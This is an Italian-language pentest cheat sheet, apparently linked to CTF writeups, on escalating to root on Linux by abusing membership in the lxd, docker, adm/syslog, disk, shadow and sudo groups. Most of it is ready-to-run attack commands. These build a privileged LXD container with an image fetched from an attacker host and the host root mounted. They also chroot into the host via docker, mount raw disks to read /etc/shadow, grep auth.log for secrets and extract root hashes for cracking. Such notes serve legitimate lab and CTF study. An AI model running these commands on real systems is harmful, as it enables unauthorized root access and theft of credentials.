#Privesc_Linux

---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Enumerazione dei Gruppi]]
- [[#Gruppi a Rischio]]
    1. [[#lxd]]
    2. [[#docker]]
    3. [[#adm e syslog]]
    4. [[#disk]]
    5. [[#shadow]]
    6. [[#sudo]]

---
---
---
### Introduzione
In Linux, lâ€™appartenenza a certi **gruppi locali** puÃ² offrire un attaccante dei privilegi **impliciti** o **indiretti**, utili per lâ€™escalation.  
Questi gruppi possono fornire accesso a:

- comandi sensibili (es. `lxd`, `docker`)
- file riservati (`/var/log/`, `/etc/shadow`, `/dev/sd*`)
- device fisici o virtuali
- funzionalitÃ  che aggirano lâ€™isolamento

> Non richiedono SUID o password: basta appartenere al gruppo per abusarne.

---
### Enumerazione dei Gruppi
Controlla i gruppi dellâ€™utente corrente:

```
id
```

Oppure:

```
groups
```

Verifica i membri di un gruppo sospetto:

```
getent group nomegruppo
```

---
### Gruppi a Rischio
#### lxd
Il gruppo `lxd` consente la gestione completa dei container LXD.

**Abuso:**
- Creazione container privilegiati
- Montaggio di directory host (es: `/`)
- Accesso root via container

```
git clone https://github.com/saghul/lxd-alpine-builder.git  #Sulla macchina attaccante
wget IP_KALI/alpine-v3.13-x86_64-20210218_0139.tar.gz
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

ðŸ“šâ€‹ Writeups:
- [[Linux#Tabby| Tabby]],


---
#### docker
Appartenere al gruppo `docker` consente di **interagire con il socket Docker**, eseguendo container arbitrari come `root`.

```
docker images
docker run -v /:/mnt --rm -it DOCKER_IMAGE chroot /mnt sh
```
   
Effetto: shell root sullâ€™host.

ðŸ“šâ€‹ Writeups:
- [[Linux#Peppo| Peppo]],[[Linux#Ultratech| Ultratech]],

---
#### adm e syslog
Consentono la lettura di **log di sistema**: `/var/log/auth.log`, `/var/log/syslog`, ecc.

**Abuso:**
- Dump di password digitate
- Leak di token e chiavi API
- Comandi `sudo` visibili

```
cat /var/log/auth.log | grep sudo
```

---
#### disk
Permette accesso in lettura/scrittura a device in `/dev/sd*`.

**Abuso:**
- Montaggio filesystem root
- Manipolazione partizioni
- Lettura diretta da disco

```
mount /dev/sda1 /mnt
cat /mnt/etc/shadow
```

```
df -h
debugfs /dev/sd1
cat /root/proof.txt
```

ðŸ“šâ€‹ Writeups:
- [[Linux#Extplorer| Extplorer]],[[Linux#Fanatastic| Fanatastic]],

---
#### shadow
Accesso in lettura a `/etc/shadow`, file che contiene le password hashate degli utenti.

**Abuso:**
- Estrazione hash `root`
- Crack con John/Hashcat

```
cat /etc/shadow | grep root
```

---
#### sudo
Appartenenza al gruppo `sudo` **non garantisce** privesc automatica, ma lâ€™utente puÃ² avere comandi privilegiati senza password (`NOPASSWD`).

```
sudo -l
```

Verifica se puÃ² eseguire `ALL`, `bash`, `python`, ecc.

